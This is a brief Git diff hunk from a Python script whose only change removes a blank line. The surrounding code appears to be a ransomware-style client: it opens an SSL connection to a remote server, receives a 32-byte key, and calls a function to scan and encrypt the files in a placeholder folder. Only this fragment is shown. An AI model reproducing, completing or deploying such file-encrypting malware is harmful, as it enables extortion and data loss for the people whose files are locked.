@@ -45,6 +45,5 @@ if __name__ == "__main__":
     ssl_ssock=context.wrap_socket(sock,server_side=False)
     key = ssl_ssock.recv(32)
     scan_and_encrypt(key,"replace with folder location")
-
     
     
